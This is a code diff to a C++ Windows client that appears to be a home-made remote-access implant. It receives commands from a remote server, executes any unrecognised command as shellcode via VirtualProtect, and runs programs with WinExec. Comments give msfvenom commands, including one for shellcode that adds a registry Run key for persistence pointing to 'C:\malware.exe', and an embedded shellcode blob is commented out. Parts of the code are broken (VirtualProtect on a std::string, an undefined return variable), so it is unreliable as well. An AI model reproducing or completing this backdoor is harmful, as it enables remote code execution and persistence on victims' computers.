@@ -1,3 +1,16 @@
+/* TODO:
+ * https://github.com/rapid7/metasploit-framework/tree/master/data/headers/windows
+ * https://github.com/rapid7/metasploit-framework/tree/master/data/templates/src/pe
+ * https://github.com/rapid7/metasploit-framework/tree/master/external/source/shellcode/windows
+ *
+ * https://github.com/rapid7/metasploit-framework/tree/master/data/utilities/encrypted_payload
+ *
+ *
+ *
+ * */
+
+
+
 #include "client.h"
 
 
@@ -16,7 +29,9 @@
 
 // TODO: -static makes file 2-5x larger
 // x86_64-w64-mingw32-g++ -static -o client.exe client.cpp -lws2_32 
-// client.cpp
+//
+// # Generate 64-bit shellcode
+// msfvenom -p windows/x64/exec CMD="path/to/custom.exe" -f c
 
 Client::Client() : 
     socket_(INVALID_SOCKET),
@@ -90,6 +105,47 @@ bool Client::createConnection(const std::string& host, const std::string& port)
     return connected;
 }
 
+// receivePayload ONLY
+std::string Client::receiveData()
+{
+    if (!connected_) {
+        throw std::runtime_error("Not connected to server");
+    }
+    
+    int result = recv(socket_, recvBuffer_, RECV_BUFFER_SIZE, 0);
+    
+    if (result > 0) 
+    {
+        // Success - create string from the received data
+        //return std::string(recvBuffer_, result);
+        // TODO: this might only be happening becuz im using ncat to send messages rn
+		/*
+        std::string received(recvBuffer_, result);
+        if (!received.empty() && received.back() == '\n') 
+        {
+            received.pop_back();
+            if (!received.empty() && received.back() == '\r') 
+            {
+                received.pop_back();
+            }
+        }*/
+        return received;
+    } 
+    else if (result == 0) 
+    {
+        // Connection closed by server
+        connected_ = false;
+        throw std::runtime_error("Connection closed by server");
+    } 
+    else 
+    {
+        // Error occurred
+        connected_ = false;
+        throw std::runtime_error("Receive failed: " + std::to_string(WSAGetLastError()));
+    }
+}
+
+/*
 //void Client::receiveData()
 std::string Client::receiveData()
 {
@@ -127,7 +183,7 @@ std::string Client::receiveData()
         connected_ = false;
         throw std::runtime_error("Receive failed: " + std::to_string(WSAGetLastError()));
     }
-}
+}*/
 
 void Client::sendData(const std::string& data) {
     if (!connected_) {
@@ -169,51 +225,15 @@ void Client::execute(std::string program)
 	WinExec(program.c_str(), SW_SHOW);
 }
 
-//#include <windows.h>
-//#include <vector>
+// # Generate shellcode that runs reg.exe to add persistence
+// msfvenom -p windows/exec CMD="reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyApp /t REG_SZ /d C:\malware.exe" -f c
 
-//void executeShellcode(std::vector<uint8_t>& shellcode) {
-/*
-void executeShellcode(std::vector<uint8_t>& fart_shellcode) {
-
-    unsigned char shellcode[] =
-        "\x31\xc0\x50\x68\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68\x48\x65"
-        "\x6c\x6c\x89\xe1\x50\x51\xb8\xc7\x93\xbf\x77\xff\xd0";
-
-    // Size: 29 bytes
-    // Shows: "Hello World!" in a message box
-
-
-    // Allocate executable memory
-    void* exec_mem = VirtualAlloc(
-        NULL, 
-        shellcode.size(), 
-        MEM_COMMIT | MEM_RESERVE, 
-        PAGE_EXECUTE_READWRITE
-    );
-    
-    if (!exec_mem) {
-        return; // Allocation failed
-    }
-    
-    // Copy shellcode
-    memcpy(exec_mem, shellcode.data(), shellcode.size());
-    
-    // Execute - Method 1 (typedef)
-    typedef void (*ShellcodeFunc)();
-    ShellcodeFunc func = (ShellcodeFunc)exec_mem;
-    func();
-    
-    // Cleanup (optional)
-    VirtualFree(exec_mem, 0, MEM_RELEASE);
-}*/
-
-//#include <vector>
-
-// TODO: fix... add debugs, console/tcp connection dies everytime
-void executeShellcode() {
+// TODO: this is extremly basic bare min for executing shell code
+//void executeShellcode(unsigned char bPayload) {
+void executeShellcode(std::string& payload) {
 	//#define SCSIZE 4096
 	//char bPayload[SCSIZE] = "PAYLOAD:";
+	/*
 	unsigned char bPayload[] =
 		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
 		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
@@ -234,15 +254,13 @@ void executeShellcode() {
 		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
 		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
 		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
-		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
-
-
+		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";*/
 
 	DWORD dwOldProtect;
 	//if (VirtualProtect(bPayload, SCSIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect))
-	if (VirtualProtect(bPayload, 4096, PAGE_EXECUTE_READWRITE, &dwOldProtect))
+	if (VirtualProtect(payload, sizeof(payload), PAGE_EXECUTE_READWRITE, &dwOldProtect))
 	{
-		(*(void (*)()) bPayload)();
+		(*(void (*)()) payload)();
 	}
 	else
 	{
@@ -279,11 +297,11 @@ void Client::run(const std::string& host, const std::string& port)
                     std::cout << "poop" << command << std::endl;
                     execute();
                 }
-                else if (command == "sc")
-                {
-                    executeShellcode();
-                }
-                std::cout << "Server command: " << command << std::endl;
+				else
+				{
+                    executeShellcode(command);
+				}
+                //std::cout << "Server command: " << command << std::endl;
             } catch (const std::exception& e) {
             std::cerr << "Connection lost: " << e.what() << std::endl;
             break;
